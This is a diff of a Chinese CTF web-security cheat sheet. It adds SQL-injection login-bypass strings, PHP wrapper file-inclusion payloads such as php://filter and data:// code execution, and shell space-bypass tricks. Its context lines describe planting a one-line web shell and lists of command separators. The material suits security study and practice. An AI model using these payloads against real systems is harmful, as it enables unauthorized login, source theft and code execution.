@@ -1,6 +1,6 @@
 # Web常用知识点摘录
 
-`更新时间 2024-5-12`
+`更新时间 2024-5-19`
 
 ---
 
@@ -84,6 +84,8 @@ strlen(arg)可以返回arg的字符串长度
 
 一般来说，都会使用 `ls -t` 来构建一句话木马，首先反序列创建相应文件，然后输入 `ls -t>0` 来创建生成木马的文件，然后输入 `sh 0` 来生成木马，接着用蚁剑连接就行了
 
+可以使用数组绕过
+
 # 命令分隔符
 
 常见的命令分隔符有 `;` , `|` , `&` , `||` , `&&` ，如果他们被屏蔽了，还可以使用 `%0a` 或 `%0d`
@@ -107,3 +109,161 @@ md5(arg)函数可以返回参数arg的md5值
 ### 绕过
 
 在进行弱比较时，为md5()函数内传入数组会报错，但是返回True
+
+# SQL万能账号密码
+
+## 账号
+
+- 数值型万能账号
+
+```
+a or true #
+
+a or 1 #
+
+a or 1=1 #
+
+a or true -- a
+
+a or 1 -- a
+
+a or 1=1 -- a
+```
+
+- 单引号字符型万能密码
+
+```
+a' or true #
+
+a' or 1 #
+
+a' or 1=1 #
+
+a' or true --a
+
+a' or 1 -- a
+
+a' or 1=1 -- a
+```
+
+- 双引号字符型万能密码
+
+```
+a" or true #
+
+a" or 1 #
+
+a" or 1=1 #
+
+a" or true -- a
+
+a" or 1 -- a
+
+a" or 1=1 -- a
+```
+
+## 密码
+
+- 数值型万能密码
+
+```
+admin #
+
+admin -- a
+```
+
+- 单引号字符串型万能密码
+
+```
+admin' #
+
+admin' -- a
+```
+
+- 双引号字符串型万能密码
+
+```
+admin” #
+
+admin" -- a
+```
+
+# mb_substr()
+
+mb_substr(arg1, arg2, arg3)函数从arg1中提取字符，从arg2开始，arg3是要提取的长度
+
+# mb_strpos()
+
+mb_strpos(arg1, arg2, arg3)函数返回arg2在arg1中出现的位置，arg3是开始的位置
+
+# 伪协议
+
+在php中，内置了很多URL风格的封装协议，可用于包含指定文件
+
+### file://
+
+file://用于访问本地文件系统，后常接文件绝对路径
+
+`file=file://C:/abc/abc.php`
+
+### php://
+
+php://用户访问输入输出流，在CTF中常用php://filter来将包含文件作为base64编码输出，如果直接作为php代码输出则无法查看源代码
+
+`file=php://filter/convert.base64-encode/resource=abc.php`
+
+### zip://
+
+zip://用于访问压缩包文件
+
+`file=zip://C:/abc/abc.zip%23abc.php`
+
+*注：%23后面的abc.php是压缩包内的文件*
+
+### data://
+
+data://与php://类似，但是data://可以直接执行php代码
+
+`data://text/plain,<?php phpinfo();?>`
+
+同时也可以使用base64编码
+
+`data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=`
+
+# Linux空格替换
+
+- `${IFS}`
+
+- `$IFS$1`
+
+- `${IFS`
+
+- `%20`
+
+- `%09`
+
+# 堆叠注入
+
+堆叠注入是SQL注入中的一类，一般不会遇到，堆叠注入的原理是使用分号分隔多个sql语句，让后台函数同时执行。但是绝大部分php均使用 `mysqli_query()` 函数，该函数只会执行一个语句
+
+# SQL预编译命令
+
+在SQL中，可以使用prepare关键字预先定义好需要执行的命令，然后使用execute执行
+
+`prepare <name> from '<command>'`
+
+`execute <name>`
+
+\<command>可以为SQL中的函数，如 `concat()` 等
+
+\<command>内容可以为16进制，但是需要添加 `0x`
+
+# handler
+
+handler是Mysql独有的查询字段数据的命令，分为打开，读取和关闭三步
+
+`handler <table> open;`
+
+`handler <table> read;`
+
+`handler <table> close;`
